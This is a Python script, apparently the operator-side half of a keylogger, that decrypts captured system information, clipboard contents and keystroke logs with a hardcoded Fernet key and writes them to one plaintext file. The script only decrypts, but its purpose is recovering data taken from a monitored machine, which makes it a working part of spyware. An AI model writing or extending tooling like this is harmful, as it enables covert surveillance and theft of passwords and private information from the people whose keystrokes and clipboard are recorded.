from cryptography.fernet import Fernet
import os

key = "hrRWxHCzOg_YQpYq7sIimvEthlXxFgUgEd84RbIgthg="

system_information_e = 'e_systeminfo.txt'
clipboard_information_e = 'e_clipboard.txt'
keys_information_e = 'e_key_log.txt'

encrypted_files = [system_information_e, clipboard_information_e, keys_information_e]
count = 0

for decrypting_file in encrypted_files:
    if os.path.exists(decrypting_file):
        with open(decrypting_file, 'rb') as f:
            data = f.read()

        fernet = Fernet(key)
        try:
            decrypted = fernet.decrypt(data)
        except Exception as e:
            print(f"Error decrypting {decrypting_file}: {e}")
            continue

        with open("decryption.txt", 'ab') as f:
            f.write(decrypted)

        count += 1
    else:
        print(f"File {decrypting_file} does not exist.")